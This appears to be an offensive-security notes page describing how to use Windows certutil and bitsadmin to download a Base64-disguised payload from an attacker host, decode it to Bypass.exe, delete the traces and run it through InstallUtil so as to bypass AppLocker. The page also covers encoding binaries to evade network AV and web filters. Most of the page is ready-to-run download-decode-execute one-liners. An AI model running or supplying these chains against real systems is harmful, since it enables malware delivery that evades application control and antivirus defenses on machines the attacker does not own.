# Windows: Delivery with Certutil

> [!ABSTRACT]
> This document details the usage of **`certutil.exe`** to deliver and execute payloads. These are "Living off the Land" (LotL) binaries that are pre-installed on Windows and can often bypass security controls.

---

## 1. Automated Delivery Oneliner

**Goal:** Download an obfuscated payload, decode it, and execute it using a signed Microsoft binary (InstallUtil).

### **The Full Chain**
```cmd
# 1. Certutil: Downloads the Base64 text file
# 2. Certutil: Decodes the text into a functional .exe
# 3. Del: Deletes the intermediate text file
# 4. InstallUtil: Executes the harness, bypassing AppLocker
certutil -urlcache -f http://192.168.49.147/Bypass.txt %TEMP%\Bypass.txt && certutil -decode %TEMP%\Bypass.txt %TEMP%\Bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\Bypass.exe
```

### If the file exists
```cmd
if exist C:\Windows\Tasks\Bypass.txt (del /f /q C:\Windows\Tasks\Bypass.txt) & if exist C:\Windows\Tasks\Bypass.exe (del /f /q C:\Windows\Tasks\Bypass.exe) & bitsadmin /Transfer Job http://192.168.49.147/Bypass.txt C:\Windows\Tasks\Bypass.txt & certutil.exe -decode C:\Windows\Tasks\Bypass.txt C:\Windows\Tasks\Bypass.exe & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
```
---

## 2. Payload Preparation (Attacker Machine)

**Goal:** Transform an executable into a Base64 encoded text file to evade network-based AV detection for `.exe` files.

### **Create the Binary**
Use the C#-code in [[CLM.md]] to create Bypass.exe

### **Encode the Binary**
```cmd
certutil -encode Bypass.exe Bypass.txt
```
**Analysis:**
- The resulting `Bypass.txt` contains standard Base64 characters with a `-----BEGIN CERTIFICATE-----` header. This is often ignored by basic web filters that block executable downloads.

---

## 3. Individual Step Reference

### **Certutil: File Transfer**
A background intelligent transfer service that is less noisy than `curl` or `Invoke-WebRequest`.
```cmd
certutil -urlcache -f http://<IP>/<REMOTE_FILE> %TEMP%\<FILE>
```

### **Certutil: Binary Reconstruction**
Decodes the Base64 encoded file back into its original binary format.
```cmd
certutil -decode Bypass.txt Bypass.exe
```

### **Certutil: Direct Download**
A quick oneliner to download a file from a URL.
```cmd
# Note: This is highly detectable by modern EDRs
certutil -urlcache -split -f http://192.168.49.147/file.exe
```

---

## 4. Technical Explanation

### **The Bypass Mechanism**
By combining `certutil` (for transfer) and `certutil` (for decoding), we avoid downloading a `.exe` file directly over the network. This bypasses security gateways that inspect file extensions. Finally, executing via **`InstallUtil.exe`** allows the payload to run within the context of a signed Microsoft binary, bypassing **AppLocker** default rules.
